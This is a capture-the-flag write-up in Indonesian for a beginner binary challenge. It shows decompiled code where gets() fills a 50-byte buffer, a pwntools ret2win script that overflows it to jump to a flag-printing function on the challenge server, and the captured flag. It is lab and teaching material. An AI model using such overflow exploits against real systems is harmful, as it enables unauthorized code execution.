# Pemanasan-1
**Author:** ooflamp

**Difficulty:** easy-medium

---
## Description
inimah loncat loncat doang

## Info
```
ncat -v pemanasan-1.ctf.forestylab.com 5000 --ssl
```

## Enumeration
menggunakan ghidra dapat dilihat bahwa bin tsb memiliki 3 fungsi utama
- main()
```
/* WARNING: Unknown calling convention */

int main(void)

{
  EVP_PKEY_CTX *in_RDI;
  
  init(in_RDI);
  vuln();
  puts("Maaf ngga kenal");
  return 0;
}

```
- win()
```

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void win(void)

{
  FILE *__stream;
  char flag [50];
  FILE *flag_file;
  
  builtin_strncpy(flag,"CTF_FLAG_NOT_FOUND\n",0x14);
  flag[0x14] = '\0';
  flag[0x15] = '\0';
  flag[0x16] = '\0';
  flag[0x17] = '\0';
  flag[0x18] = '\0';
  flag[0x19] = '\0';
  flag[0x1a] = '\0';
  flag[0x1b] = '\0';
  flag[0x1c] = '\0';
  flag[0x1d] = '\0';
  flag[0x1e] = '\0';
  flag[0x1f] = '\0';
  flag[0x20] = '\0';
  flag[0x21] = '\0';
  flag[0x22] = '\0';
  flag[0x23] = '\0';
  flag[0x24] = '\0';
  flag[0x25] = '\0';
  flag[0x26] = '\0';
  flag[0x27] = '\0';
  flag[0x28] = '\0';
  flag[0x29] = '\0';
  flag[0x2a] = '\0';
  flag[0x2b] = '\0';
  flag[0x2c] = '\0';
  flag[0x2d] = '\0';
  flag[0x2e] = '\0';
  flag[0x2f] = '\0';
  flag[0x30] = '\0';
  flag[0x31] = '\0';
  __stream = (FILE *)FUN_004010e0("./flag.txt",&DAT_00402004);
  if (__stream != (FILE *)0x0) {
    fgets(flag,0x32,__stream);
  }
  printf("%s",flag);
  return;
}
```
- vuln()
```
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void vuln(void)

{
  char buf [50];
  
  printf("Inputkan nama anda: ");
  gets(buf);
  return;
}

```

dalam vuln() kita diminta memberikan input, namun `buff` hanya menerima max 50 char

kemudian dalam win terdapat placeholder `CTF_FLAG_NOT_FOUND` dan ada baris yg mencoba membaca `./flag.txt`

dari sini saya suspect kita harus membuat payload yang membuat gets(buf) overflow kemudian memanggil win()

sya meminta bantuan Ai untuk membuat python script dan didapat
```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64' 
context.os = 'linux'
context.log_level = 'debug'

ALAMAT_WIN = 0x00401180
OFFSET_PADDING = 64

payload = b""
payload += b"A" * OFFSET_PADDING
payload += p64(ALAMAT_WIN) 

try:
    p = remote("pemanasan-1.ctf.forestylab.com", 5000, ssl=True)
except Exception as e:
    print("Gagal terhubung. Periksa koneksi atau nama host.")
    print(f"Error: {e}")
    exit()

try:
    p.recvuntil(b": ") 

    print("Mengirim payload...")
    p.sendline(payload)

    print("Payload terkirim. Menerima respons...")
    response = p.recvall()

    print("Respons Diterima:")
    print(response.decode())

except EOFError:
    print("Koneksi ditutup oleh server sebelum respons penuh diterima.")
except Exception as e:
    print(f"Terjadi error saat komunikasi: {e}")
finally:
    p.close()

```

tinggal dijalankan scriptnya

## Flag 
```
FORESTY{lompat_lompat_duar_awokwk_ab30f3df}
```
